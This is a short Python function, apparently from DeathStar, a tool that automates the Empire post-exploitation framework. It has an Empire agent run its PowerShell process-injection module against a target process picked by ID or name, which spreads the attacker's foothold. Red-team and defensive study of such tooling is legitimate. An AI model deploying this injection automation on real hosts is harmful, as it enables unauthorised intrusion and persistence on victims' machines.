async def crystallize(agent, process, listener="DeathStar"):
    options = {"Listener": listener}
    if process.isdigit():
        options["ProcId"] = str(process)
    else:
        options["ProcName"] = str(process)

    output = await agent.execute("powershell/management/psinject", options=options)

    results = output["results"]
    log.debug(results)
    return results
